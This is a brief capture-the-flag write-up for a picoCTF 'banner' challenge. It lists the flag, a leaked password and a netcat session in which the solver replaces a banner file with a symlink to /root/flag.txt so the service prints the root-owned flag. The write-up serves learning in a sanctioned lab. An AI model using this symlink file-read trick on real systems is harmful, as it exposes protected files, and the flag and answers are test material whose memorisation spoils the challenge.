## Reto
## Descripción
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 52968`.

Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 53677`.

From the above information abuse the machine and find the flag in the /root directory.
## Solución
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
## Notas

```
a@Camilas-MacBook-Pro ~ % nc tethys.picoctf.net 54823
*************************************
**************WELCOME****************
*************************************
what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ rm /home/player/banner
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
a@Camilas-MacBook-Pro ~ % nc tethys.picoctf.net 54823
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
```
## Referencias
